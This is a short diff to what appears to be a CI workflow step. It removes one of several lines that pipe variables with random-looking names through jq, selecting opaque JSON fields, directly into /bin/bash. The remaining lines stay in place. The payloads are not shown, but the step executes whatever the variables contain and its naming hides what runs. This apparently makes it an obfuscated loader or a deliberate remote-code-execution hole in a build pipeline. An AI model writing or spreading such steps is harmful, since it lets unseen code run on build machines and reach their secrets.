@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$pi68" | jq -r .n9752 | /bin/bash
           echo $iz2 | jq -r .oj86158 | /bin/bash
-          printf '%s' "$egfcq23" | jq -r .mfjcq740 | /bin/bash
           echo $db1 | jq -r .dy94 | /bin/bash
           echo $dhnak18417 | jq -r .vzks1 | /bin/bash
           printf '%s' "$biyv73" | jq -r .pwdh8296 | /bin/bash
